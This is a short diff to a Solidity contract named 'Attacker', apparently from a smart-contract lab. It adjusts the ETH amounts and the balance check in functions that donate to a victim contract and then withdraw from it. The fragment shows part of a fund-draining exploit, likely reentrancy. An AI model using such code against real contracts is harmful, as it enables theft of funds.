@@ -16,13 +16,13 @@ contract Attacker{
 
      // Call this function first
     function donateToVictim() public payable {
-        victimContract.donate{value: msg.value}(address(this));// Send a transaction with .002 eth
+        victimContract.donate{value: msg.value}(address(this));// Send a transaction with .001 eth
     }
 
     // call this funciton second
     function attack() public {
-       if (address(victimContract).balance >= .002 ether){ // when this is called the contract should have .003 eth
-        victimContract.withdraw(.001 ether); // withdraws the fi
+       if (address(victimContract).balance >= 0 ether){ // when this is called the contract should have .002 eth
+        victimContract.withdraw(.001 ether); 
         }
     }
    
